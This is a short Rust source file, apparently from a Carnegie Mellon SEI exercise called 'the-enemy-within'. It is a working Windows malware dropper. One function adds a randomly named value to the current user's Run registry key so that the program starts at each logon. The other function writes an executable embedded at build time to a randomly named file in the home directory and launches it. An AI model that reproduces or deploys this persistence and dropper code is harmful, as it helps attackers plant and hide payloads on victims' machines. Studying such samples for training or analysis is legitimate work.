// Copyright 2022 Carnegie Mellon University.
// Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
// root or contact permission@sei.cmu.edu for full terms.

extern crate dirs;
extern crate rand;
extern crate winreg;

use std::env;
use std::fs;
use std::io::Write;
use std::process::Command;

use rand::{distributions::Alphanumeric, Rng};
use winreg::{enums::*, RegKey};

static REG_KEY: &str = r"Software\Microsoft\Windows\CurrentVersion\Run";
static VALUE_NAME: &str = r"trmbWBOSDPfzkpyz";

fn persist() {
    let prog_path = format!(
        "\"{}\" /background",
        env::current_exe().unwrap().to_str().unwrap()
    );
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let run = match hkcu.open_subkey_with_flags(REG_KEY, KEY_READ | KEY_WRITE) {
        Ok(key) => key,
        Err(_) => return,
    };

    match run.set_value(VALUE_NAME, &prog_path) {
        Ok(()) => (),
        Err(_) => return,
    };
}

fn dropper() {
    #[cfg(feature = "version_1")]
    let visit_exe = include_bytes!(
        r"C:\Users\Win10\Desktop\the-enemy-within-inner1\version_1\release\the-enemy-within-inner1.exe"
    );
    #[cfg(feature = "version_2")]
    let visit_exe = include_bytes!(
        r"C:\Users\Win10\Desktop\the-enemy-within-inner1\version_2\release\the-enemy-within-inner1.exe"
    );
    #[cfg(feature = "version_3")]
    let visit_exe = include_bytes!(
        r"C:\Users\Win10\Desktop\the-enemy-within-inner1\version_3\release\the-enemy-within-inner1.exe"
    );
    #[cfg(feature = "version_4")]
    let visit_exe = include_bytes!(
        r"C:\Users\Win10\Desktop\the-enemy-within-inner1\version_4\release\the-enemy-within-inner1.exe"
    );
    let mut home = dirs::home_dir().unwrap();
    let mut exe_name: String = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(8)
        .collect();
    exe_name.push_str(".exe");
    home.push(&exe_name);

    let mut out_file = match fs::File::create(&home) {
        Ok(f) => f,
        Err(_) => return,
    };

    match out_file.write_all(visit_exe) {
        Ok(_) => (),
        Err(_) => return,
    };

    drop(out_file);

    if let Err(_) = Command::new(&home).output() {
        return;
    };
}

fn main() {
    persist();
    dropper();
}
